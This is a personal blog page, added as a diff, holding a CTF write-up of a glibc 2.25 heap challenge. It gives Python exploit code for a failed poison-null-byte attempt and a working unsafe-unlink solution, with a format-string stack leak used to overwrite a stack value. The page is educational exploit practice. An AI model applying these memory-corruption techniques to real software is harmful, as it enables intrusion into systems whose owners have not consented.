@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title> | papichulo16</title>
+  <link rel="stylesheet" href="/assets/css/style.css">
+  
+</head>
+<body>
+  <nav class="navbar">
+    <a class="menu home-link" href="/"><img src="/assets/img/chavo.png" alt="El chavo" class="pfp-img">papichulo16</a>
+
+    <div class="nav-right">
+      <a href="https://github.com/papichulo16">Github</a>
+      <a href="/contact">Contact</a>
+      <a href="/reviews">Reviews</a>
+      <div class="dropdown">
+        <span><a href="/projects">Projects ▾</a></span>
+        <div class="dropdown-content">
+          
+            <a href="/projects/1_magical_kernel.html">Magical Kernel</a>
+          
+            <a href="/projects/2_crap.html">C.R.A.P</a>
+          
+            <a href="/projects/6_ctf_writeups.html">PWN Writeups</a>
+          
+        </div>
+      </div>
+    </div>
+  </nav>
+  <hr>
+
+  <main>
+    <article class="post">
+
+  <header class="post-header">
+    <h1 class="post-title"></h1>
+  </header>
+
+  <div class="post-content">
+    <p>Alright so I started this challenge after the CTF was over. I saw that this was a heap challenge and decided that I needed more practice with the heap so I was like why not.</p>
+
+<p>The program is actually just a poison null byte challenge on glibc 2.25 so there are quite a bit of exploits I could do here. Also we don’t need a shell, just overwrite a value in the stack to become <code class="language-plaintext highlighter-rouge">0xcafebabe</code>. When I first started I thought to myself to do the google poison null byte technique and then when unlinking I would be able to write the stack address (since there is a printf leak) to the array with all of the chunk pointers and then call the <code class="language-plaintext highlighter-rouge">edit()</code> function with it.</p>
+
+<p>Sadly, this did not work well since when I tried to unlink it would just write the <code class="language-plaintext highlighter-rouge">main_arena</code> address into the chunk pointers array instead. I tried to go around this for quite a while but no cigar. I then rewatched the HeapLab unsafe unlinking video and thought to myself “oh, this is so much simpler than I thought” and recided to restart the script. Anyways here is the failed attempt:</p>
+
+<p>Edit: also the binary uses <code class="language-plaintext highlighter-rouge">strcpy()</code> for the <code class="language-plaintext highlighter-rouge">edit()</code> function. This is why there are for loops and whatnot.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># google poison null byte
+</span><span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span> <span class="c1"># 0
+</span><span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x208</span><span class="p">)</span> <span class="c1"># 1
+</span><span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">)</span> <span class="c1"># 2 
+</span><span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span> <span class="c1"># 3 (stops top chunk consolidation)
+</span>    
+<span class="n">delete</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x20</span><span class="p">)</span> <span class="c1"># poison null byte
+</span>
+<span class="c1"># remaindered chunks
+</span><span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">)</span> <span class="c1"># 4
+</span><span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">)</span> <span class="c1"># 5
+</span>     
+<span class="c1"># create consolidation + overlap
+</span><span class="n">strings_arr_target</span> <span class="o">=</span> <span class="mh">0x204dd0</span>
+    
+<span class="c1"># program uses strcpy lol
+# overwrite fd and bk
+</span><span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">strings_arr_target</span><span class="p">))</span>
+<span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">9</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">strings_arr_target</span><span class="p">))</span>
+<span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">strings_arr_target</span><span class="p">))</span>
+<span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">"AAAA"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">strings_arr_target</span> <span class="o">+</span> <span class="mi">8</span><span class="p">))</span>
+<span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">"AAA"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">strings_arr_target</span> <span class="o">+</span> <span class="mi">8</span><span class="p">))</span>
+<span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">"AA"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">strings_arr_target</span> <span class="o">+</span> <span class="mi">8</span><span class="p">))</span>
+<span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">strings_arr_target</span> <span class="o">+</span> <span class="mi">8</span><span class="p">))</span>
+<span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">strings_arr_target</span> <span class="o">+</span> <span class="mi">8</span><span class="p">))</span>
+
+<span class="n">delete</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+    
+     
+<span class="c1"># set pointers to a chunk that is in use
+</span><span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">)</span> <span class="c1"># 6
+</span>
+<span class="c1"># chunk 5 has control over fd and bk pointers now
+# stack leak at $15%p - (0xd918 - 0xd828)
+</span><span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"%15$p"</span><span class="p">)</span>
+<span class="n">target</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">view</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="mh">0xd918</span> <span class="o">-</span> <span class="mh">0xd828</span><span class="p">)</span>
+<span class="n">main_arena</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">view</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">5</span><span class="p">)[:</span><span class="o">-</span><span class="mi">6</span><span class="p">],</span> <span class="s">"little"</span><span class="p">)</span>
+<span class="n">strings_arr_target</span> <span class="o">=</span> <span class="mh">0x204dd0</span>
+
+<span class="c1"># program uses strcpy lol
+# overwrite fd and bk
+</span><span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">strings_arr_target</span> <span class="o">-</span> <span class="mi">8</span><span class="p">))</span>
+<span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">9</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">strings_arr_target</span> <span class="o">-</span> <span class="mi">8</span><span class="p">))</span>
+<span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">strings_arr_target</span> <span class="o">-</span> <span class="mi">8</span><span class="p">))</span>
+<span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="sa">b</span><span class="s">"AAAA"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">strings_arr_target</span> <span class="o">+</span> <span class="mi">8</span><span class="p">))</span>
+<span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="sa">b</span><span class="s">"AAA"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">strings_arr_target</span> <span class="o">+</span> <span class="mi">8</span><span class="p">))</span>
+<span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="sa">b</span><span class="s">"AA"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">strings_arr_target</span> <span class="o">+</span> <span class="mi">8</span><span class="p">))</span>
+<span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">strings_arr_target</span> <span class="o">+</span> <span class="mi">8</span><span class="p">))</span>
+<span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">strings_arr_target</span> <span class="o">+</span> <span class="mi">8</span><span class="p">))</span>
+
+<span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x198</span><span class="p">)</span> <span class="c1"># 7
+</span></code></pre></div></div>
+
+<p>And here is the actual solution. After I realised what I could of done I thugged it out in legit 30-45 min. It’s literally as shrimple as that.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># unsafe unlink (it is literally that shrimple)
+</span><span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">)</span> <span class="c1"># 0
+</span><span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">)</span> <span class="c1"># 1
+</span><span class="n">create</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span> <span class="c1"># 2 stops top chunk consolidation
+</span>
+<span class="c1"># stack leak at $15%p - (0xd918 - 0xd828)
+</span><span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"%15$p"</span><span class="p">)</span>
+<span class="n">key</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">view</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="mh">0xd918</span> <span class="o">-</span> <span class="mh">0xd828</span><span class="p">)</span>
+    
+<span class="c1"># change prev_inuse flag
+</span><span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x40</span><span class="p">)</span>
+    
+<span class="c1"># fake prev_size
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+    <span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x36</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x30\x00</span><span class="s">"</span><span class="p">)</span>
+
+<span class="c1"># create fake fd and bk
+</span><span class="n">target</span> <span class="o">=</span> <span class="mh">0x204db0</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+    <span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1c</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+    <span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x14</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">target</span> <span class="o">-</span> <span class="mi">8</span><span class="p">))</span>
+    
+<span class="c1"># fake size field
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+    <span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0xe</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x30\x00</span><span class="s">"</span><span class="p">)</span>
+
+<span class="c1"># consolidate
+</span><span class="n">delete</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+
+<span class="c1"># write key to strings and edit it
+</span><span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+<span class="n">edit</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">))</span>
+
+<span class="c1"># get flag
+</span><span class="n">sl</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="sa">b</span><span class="s">"5"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>It was literally so shrimple. I really gotta stop overthinking these challenges man. Heap practice makes perfect though plus I reinforced a lot of different heap techniques.</p>
+
+<p>Challenge binary and solve script are in the <code class="language-plaintext highlighter-rouge">bin</code> directory.</p>
+
+<p>+rep????</p>
+
+  </div>
+
+</article>
+
+  </main>
+
+  <footer>
+    <hr>
+    © 2025 papichulo16
+  </footer>
+</body>
+</html>
+
